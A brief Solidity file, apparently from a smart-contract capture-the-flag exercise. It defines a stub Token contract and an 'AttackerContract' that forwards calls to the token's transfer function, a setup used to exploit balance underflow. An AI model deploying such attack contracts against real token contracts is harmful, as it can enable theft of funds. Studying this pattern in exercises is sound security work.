// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;

  function transfer(address _to, uint _value) public returns (bool) {}

}

contract AttackerContract {

  Token t;

  constructor (address _TokenAddress) public {
    t = Token(_TokenAddress);
  }

  function AttackTransfer(address _to, uint _value) public {
    t.transfer(_to, _value);
  }
}